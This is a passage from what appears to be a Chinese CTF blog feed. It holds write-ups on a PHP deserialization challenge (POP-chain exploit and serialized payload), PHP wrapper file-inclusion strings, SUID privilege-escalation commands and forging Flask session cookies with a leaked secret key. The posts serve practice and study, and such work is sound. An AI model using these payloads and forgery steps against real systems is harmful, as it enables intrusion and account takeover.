&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;jinjing=<span class="string">&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Jindou</span>=<span class="string">&quot;一个筋斗能翻十万八千里！&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$f</span>=<span class="variable language_">$this</span>-&gt;yun;</span><br><span class="line">    <span class="variable">$f</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jingdouyun</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Qishier</span>=<span class="number">72</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bian</span>=<span class="string">&quot;看俺老孙七十二变！&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">Jindouyun</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;迷途中的羔羊，你相信天命吗？&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tianming;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Wukong&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;开局一根棍，装备全靠打。&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就是gc回收机制加上反序列化</p><p>链子很简单</p><p>直接上exp了</p><?phperror_reporting(0);# 帮天命人搜集法宝，重获齐天之姿！<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Jindou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Tianmingren</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming=<span class="keyword">new</span> <span class="title class_">Dinghaishenzhen</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun= <span class="keyword">new</span> <span class="title class_">Huoyanjinjing</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun-&gt;huoyan= <span class="keyword">new</span> <span class="title class_">Wuzhishan</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>因为这里还存在md5的绕过 直接让J=0e215962017最后因为还要绕过异常处理 所以我们直接反序列化一个数组 让第二个索引为0 即可绕过payload<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:?J=0e215962017</span><br><span class="line"></span><br><span class="line">POST=Wukong=a:2:&#123;i:0;O:11:&quot;Tianmingren&quot;:2:&#123;s:8:&quot;tianming&quot;;O:15:&quot;Dinghaishenzhen&quot;:2:&#123;s:6:&quot;Jindou&quot;;N;s:3:&quot;yun&quot;;O:13:&quot;Huoyanjinjing&quot;:2:&#123;s:6:&quot;huoyan&quot;;O:9:&quot;Wuzhishan&quot;:3:&#123;s:2:&quot;wu&quot;;N;s:3:&quot;zhi&quot;;N;s:4:&quot;shan&quot;;N;&#125;s:7:&quot;jinjing&quot;;N;&#125;&#125;s:3:&quot;ren&quot;;N;&#125;i:0;i:0;&#125;</span><br></pre></td></tr></table></figure>### CTFSHOW卷王杯[easy unserialize]]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;f 复现的时候gc回收机制发现不会 写出来当笔记了&lt;/p&gt;
&lt;p&gt;学习from：&lt;a href=&quot;https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=QaqiI3Y5p2GbD&quot;&gt;https://xz.ali</summary>
      
    
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/categories/unserialize/"/>
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>php 伪协议</title>
    <link href="https://gu0f3n.github.io/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://gu0f3n.github.io/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2024-11-16T03:37:49.000Z</published>
    <updated>2024-11-16T03:44:55.925Z</updated>
    
    <content type="html"><![CDATA[<p>首先来看一下有哪些文件包含函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copyinclude、<span class="keyword">require</span>、<span class="keyword">include_once</span>、<span class="keyword">require_once</span>、highlight_file</span><br><span class="line">show_source 、readfile 、file_get_contents 、fopen 、file</span><br></pre></td></tr></table></figure><p>有哪些伪协议：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">Copyfile:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="keyword">data</span>:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="keyword">expect</span>:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h4 id="2-1-php-filter"><a href="#2-1-php-filter" class="headerlink" title="2.1 php:&#x2F;&#x2F;filter"></a>2.1 php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copy?page=php://filter/read=convert.base64-encode/resource=../flag.php</span><br></pre></td></tr></table></figure><h4 id="2-2-file-协议"><a href="#2-2-file-协议" class="headerlink" title="2.2 file:&#x2F;&#x2F;协议"></a>2.2 file:&#x2F;&#x2F;协议</h4><p>用于访问本地文件系统，不受allow_url_fopen与allow_url_include的影响</p><p>即file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">Copy?path=file:<span class="regexp">//</span><span class="regexp">/var/</span>www/html/flag.txt</span><br></pre></td></tr></table></figure><h4 id="2-3-php-input"><a href="#2-3-php-input" class="headerlink" title="2.3 php:&#x2F;&#x2F;input"></a>2.3 php:&#x2F;&#x2F;input</h4><p>php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行</p><p>php:&#x2F;&#x2F;input 可以用来生成一句话</p><p>利用该方法，我们可以直接写入php文件，输入file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，写入php代码：</p><h4 id="2-4-data-协议"><a href="#2-4-data-协议" class="headerlink" title="2.4 data:&#x2F;&#x2F;协议"></a>2.4 data:&#x2F;&#x2F;协议</h4><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：</p><h4 id="2-5-zip-bzip2-zlib-协议"><a href="#2-5-zip-bzip2-zlib-协议" class="headerlink" title="2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议"></a>2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</h4><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名</p><p>如果网站允许我们上传压缩文件，我们也可以将php文件压缩后进行上传，再通过zip:&#x2F;&#x2F;协议执行。</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731728678644.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先来看一下有哪些文件包含函数：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Copyinclude、&lt;span class=&quot;keyword&quot;&gt;</summary>
      
    
    
    
    <category term="php" scheme="https://gu0f3n.github.io/categories/php/"/>
    
    
    <category term="php" scheme="https://gu0f3n.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>suid提权</title>
    <link href="https://gu0f3n.github.io/2024/11/14/suid%E6%8F%90%E6%9D%83/"/>
    <id>https://gu0f3n.github.io/2024/11/14/suid%E6%8F%90%E6%9D%83/</id>
    <published>2024-11-14T07:22:27.000Z</published>
    <updated>2024-11-14T07:40:10.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-suid提权"><a href="#Linux-suid提权" class="headerlink" title="Linux suid提权"></a>Linux suid提权</h1><h2 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid"></a>什么是suid</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</span><br></pre></td></tr></table></figure><p>在Linux操作系统中，为了有效管理和维护用户及用户组的安全性和权限控制，系统引入了三个关键配置文件来存储相关信息：</p><ul><li><code>/etc/passwd</code>：此文件存储了系统中所有用户的基本信息，包括但不限于用户名、用户ID（UID）、默认组ID（GID）、用户描述、家目录路径以及登录Shell等。</li><li><code>/etc/shadow</code>：为了增强安全性，实际的用户密码哈希值被存储在这个文件中，而不是在 <code>/etc/passwd</code> 中公开可见。只有具有适当权限的进程才能读取此文件。</li><li><code>/etc/group</code>：该文件记录了系统中各个用户组的信息，包括组名、组密码（很少使用）、组ID（GID）以及属于该组的成员列表。</li></ul><p>每个文件系统中的文件都包含了与用户和组相关的元数据，这些信息定义了文件的所有权和访问权限。具体来说，每个文件的文件头（inode）中都会记录文件的所有者（用户）和所属组，以及相应的读、写、执行权限。</p><p>关于 <code>/etc/passwd</code> 文件的格式，每一行代表一个用户，由七个字段组成，各字段之间用冒号（:）分隔：</p><ol><li><strong>用户名</strong>（User Name）：这是用户登录系统时使用的名称。</li><li><strong>密码占位符</strong>（Password Placeholder）：早期版本的 Linux 系统中，这里会直接存储加密后的密码，但现在通常只是一个占位符（如 <code>x</code> 或 <code>*</code>），实际密码被安全地存储在 <code>/etc/shadow</code> 中。</li><li><strong>用户ID（UID）</strong>：每个用户在系统中都有一个唯一的数字标识符。</li><li><strong>主组ID（GID）</strong>：用户所属的主要用户组的ID。</li><li><strong>用户描述</strong>（User Description）：也称为 GECOS 字段，通常包含用户的全名、办公室号码、电话等信息。</li><li><strong>家目录</strong>（Home Directory）：用户登录后的工作目录路径。</li><li><strong>登录Shell</strong>（Login Shell）：用户登录时启动的命令解释器。例如，<code>/bin/bash</code> 表示使用 Bash shell，而 <code>/sbin/nologin</code> 则表示该账户不允许登录。</li></ol><p>通过这样的设计，Linux 系统能够实现细粒度的权限控制，确保系统的稳定性和安全性，同时也为管理员提供了强大的工具来管理用户和资源。</p><p>example:</p><p>root:x:0:0:root:&#x2F;root:&#x2F;usr&#x2F;bin&#x2F;zsh<br>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin<br>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>在Linux系统中，SUID（Set User ID）是一种特殊的文件权限位，允许普通用户在执行特定程序时临时获得该程序文件所有者的权限。这一机制在某些情况下非常有用，比如允许非特权用户执行需要更高权限的操作。然而，不当使用SUID权限可能会带来严重的安全风险，因此在系统管理和安全加固过程中需要特别谨慎。</p><h3 id="SUID权限详解"><a href="#SUID权限详解" class="headerlink" title="SUID权限详解"></a>SUID权限详解</h3><h4 id="定义与作用"><a href="#定义与作用" class="headerlink" title="定义与作用"></a>定义与作用</h4><p>SUID权限允许一个可执行文件在其运行期间，使执行该文件的进程拥有文件所有者的权限，而不是执行者的权限。这意味着，如果一个文件的所有者是 <code>root</code> 并且设置了SUID位，那么任何用户在执行该文件时，都将获得 <code>root</code> 用户的权限。</p><h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><p>在Linux中，可以通过以下命令设置SUID位：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s /path/to/file</span><br></pre></td></tr></table></figure><p>这会在文件权限的用户执行位上添加一个 <code>s</code>，表示设置了SUID位。例如，一个文件的权限可能显示为 <code>-rwsr-xr-x</code>，其中 <code>s</code> 表示SUID位已设置。</p><h4 id="安全风险"><a href="#安全风险" class="headerlink" title="安全风险"></a>安全风险</h4><p>虽然SUID位在某些场景下非常有用，但它也带来了潜在的安全风险。如果一个文件设置了SUID位并且存在漏洞，攻击者可能会利用这些漏洞提升自己的权限。例如，如果一个普通用户的UID被修改为0（即 <code>root</code> 用户的UID），那么该用户登录系统时将自动获得 <code>root</code> 权限，这显然是非常危险的。</p><h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>在系统加固过程中，应采取以下措施来减少SUID带来的安全风险：</p><ol><li><p><strong>定期审计</strong>：</p><ul><li>使用 <code>find</code> 命令查找所有设置了SUID位的文件：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure></li><li>检查这些文件是否必要设置SUID位，如果不是，则移除SUID位：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u-s /path/to/file</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>最小权限原则</strong>：</p><ul><li>确保只有必要的文件才设置SUID位，避免不必要的权限提升。</li><li>对于必须设置SUID位的文件，确保其代码经过严格的安全审查，没有已知漏洞。</li></ul></li><li><p><strong>用户管理</strong>：</p><ul><li>确保没有普通用户的UID被设置为0。可以通过以下命令检查：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123;print $1&#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure></li><li>如果发现有非 <code>root</code> 用户的UID为0，立即修改其UID。</li></ul></li><li><p><strong>日志监控</strong>：</p><ul><li>启用并配置系统日志，监控SUID文件的执行情况，及时发现异常行为。</li></ul></li></ol><p>通过上述措施，可以有效地管理和控制SUID权限，减少潜在的安全风险，确保系统的稳定性和安全性。</p><p>具有suid权限的二进制可执行文件有：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap vim find bash more less nano cp awk</span><br></pre></td></tr></table></figure><p>相关命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li><pre><code>**1. `find**``find` 是一个强大的命令行工具，用于在文件系统中搜索文件和目录。它可以根据各种条件（如文件名、大小、权限等）来查找文件。2. `/``/` 表示从文件系统的根目录开始搜索。也就是说，`find` 会从系统的最顶层开始，递归地搜索所有子目录。3. `-perm -u=s``-perm` 选项用于指定要查找的文件权限。这里的 `-u=s` 表示查找具有SUID权限的文件。- `-u` 表示用户（user）权限。- `=s` 表示SUID位已设置。4. `-type f``-type` 选项用于指定要查找的文件类型。这里的 `f` 表示查找常规文件，而不是目录或其他特殊类型的文件。- `f` 表示普通文件。- 其他常见类型包括 `d`（目录）、`l`（符号链接）、`c`（字符设备）等。5. `2&gt;/dev/null`这部分用于处理命令执行过程中产生的错误信息。- `2` 表示标准错误输出（stderr），它是进程的第二个文件描述符。- `&gt;` 表示重定向操作符，用于将某个输出重定向到另一个地方。- `/dev/null` 是一个特殊的文件，任何写入它的内容都会被丢弃。这里的作用是忽略 `find` 命令执行过程中产生的错误信息，使其不会显示在终端上。</code></pre><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731569964890.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-suid提权&quot;&gt;&lt;a href=&quot;#Linux-suid提权&quot; class=&quot;headerlink&quot; title=&quot;Linux suid提权&quot;&gt;&lt;/a&gt;Linux suid提权&lt;/h1&gt;&lt;h2 id=&quot;什么是suid&quot;&gt;&lt;a href=&quot;#什么是sui</summary>
      
    
    
    
    <category term="提权" scheme="https://gu0f3n.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://gu0f3n.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>session伪造</title>
    <link href="https://gu0f3n.github.io/2024/11/14/session%E4%BC%AA%E9%80%A0/"/>
    <id>https://gu0f3n.github.io/2024/11/14/session%E4%BC%AA%E9%80%A0/</id>
    <published>2024-11-14T04:35:29.000Z</published>
    <updated>2024-11-19T03:06:45.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flask的session伪造"><a href="#flask的session伪造" class="headerlink" title="flask的session伪造"></a>flask的session伪造</h2><h3 id="1-sessiond作用"><a href="#1-sessiond作用" class="headerlink" title="1.sessiond作用"></a>1.sessiond作用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。</span><br><span class="line">用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息</span><br></pre></td></tr></table></figure><h3 id="2-flask-session的储存方式"><a href="#2-flask-session的储存方式" class="headerlink" title="2.flask session的储存方式"></a>2.flask session的储存方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种方式：直接存在客户端的cookies中</span><br><span class="line"></span><br><span class="line">第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</span><br><span class="line"></span><br><span class="line">flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</span><br></pre></td></tr></table></figure><h3 id="3-flask的session格式"><a href="#3-flask的session格式" class="headerlink" title="3.flask的session格式"></a>3.flask的session格式</h3><p>flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br><span class="line">session数据                                     时间戳       签名               </span><br></pre></td></tr></table></figure><p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p><p>签名：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p><h3 id="4、flask-session伪造"><a href="#4、flask-session伪造" class="headerlink" title="4、flask session伪造"></a>4、flask session伪造</h3><p>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。</p><p>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><h2 id="ISCTF2024【小蓝鲨的故事】"><a href="#ISCTF2024【小蓝鲨的故事】" class="headerlink" title="ISCTF2024【小蓝鲨的故事】"></a>ISCTF2024【小蓝鲨的故事】</h2><p>就是一个简单的session伪造 </p><p>页面就是一个简单的重定向</p><p>然后用dirsearch 扫描发现两个&#x2F;robots.txt &#x2F;flag</p><p>直接进入&#x2F;flag 发现是进不去的 &#x2F;robots.txt 可以发现 有东西 结合提示 发现这就是key </p><p>那么 &#x2F;flag 可以看到cookie 存储的是session</p><p>key:SAVPiEkH</p><p>cookie:eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw</p><p>我们利用flask-session-cookie-manager</p><p>先将 这段session 解码 发现</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw&#x27; -s &#x27;SAVPiEkH&#x27;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;username&#x27;: b&#x27;www-data&#x27;&#125;</span><br></pre></td></tr></table></figure><p>得到{‘username’: b’www-data’}</p><p>但是不知道要怎么伪造成什么   admin  root 都试过了当时做题卡在这 </p><p>最后看wp 发现有一个&#x2F;Hacker</p><p>显示他叫ISctf_Hacker</p><p>。。dirsearch 没有这个字典 (｡･∀･)ﾉﾞ嗨</p><p>我们伪造成ISctf_Hacker 即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s&#x27;SAVPiEkH&#x27; -t &quot;&#123;&#x27;username&#x27;: b&#x27;ISctf_Hacker&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</span><br></pre></td></tr></table></figure><p>eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</p><p>将这个传入 &#x2F;flag 的cookie 得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCTF&#123;8534881b-b09d-4811-9da2-40695b41c158&#125;</span><br></pre></td></tr></table></figure><h2 id="ISCTF2024【新闻系统】"><a href="#ISCTF2024【新闻系统】" class="headerlink" title="ISCTF2024【新闻系统】"></a>ISCTF2024【新闻系统】</h2><p>给了一个登录界面 尝试 admin  弱口令爆破 没成功</p><p>然后 就看了下cookie 发现有session 那就直接找key</p><p>题目给了一个附件 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.config[&quot;SECRET_KEY&quot;] = &quot;W3l1com_isCTF&quot;</span><br></pre></td></tr></table></figure><p>直接给了</p><p>我们解码看下是个啥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;.eJyrVsrJT8_Mi08tKsovUrIqKSpN1VEqSCwuLs8vSlGyUipJLS4xNDRU0lEqLkksKS0GCpUWpxYB-SAqLzE3FapIqRYA7_MZ7A.Zzr02A.cbGkQjMXcWrkDVwMdM77W1k-KBI&#x27; -s &#x27;W3l1com_isCTF&#x27;       </span><br><span class="line">&#123;&#x27;login_error&#x27;: True, &#x27;password&#x27;: &#x27;test111&#x27;, &#x27;status&#x27;: &#x27;user&#x27;, &#x27;username&#x27;: &#x27;test&#x27;&#125;</span><br></pre></td></tr></table></figure><p>只是个登录报错 还得审计下附件给的源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure><p>审计代码可以发现我们只要 伪造admin 就会重定向到 &#x2F;admin 这个路由</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;password&#x27;: &#x27;admin222&#x27;, &#x27;status&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot; -s &quot;W3l1com_isCTF&quot;</span><br><span class="line"></span><br><span class="line">.eJyrVipILC4uzy9KUbJSSkzJzcwzMjJS0lEqLkksKS2GiQEFSotTi_ISc1PhQrUAUyMTvw.Zzv_wA.FVJA55ixFNYaH2_r_-uxCrZqN4U</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后访问这个路由&#x2F;admin 发现进入后台 然后还得继续审计代码 后面的内容就是 反序列化的内容 </p><p>放在其他地方讲</p><p>总之session 伪造 首先 看cookie 是不是传入的session 其次 需要 给的密钥 然后 根据需求 需要伪造成什么 应该差不多就是这样了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;flask的session伪造&quot;&gt;&lt;a href=&quot;#flask的session伪造&quot; class=&quot;headerlink&quot; title=&quot;flask的session伪造&quot;&gt;&lt;/a&gt;flask的session伪造&lt;/h2&gt;&lt;h3 id=&quot;1-sessiond作用&quot;</summary>
      
    
    
    
    <category term="session" scheme="https://gu0f3n.github.io/categories/session/"/>
    
    
    <category term="session" scheme="https://gu0f3n.github.io/tags/session/"/>
    
  </entry>
  
</feed>
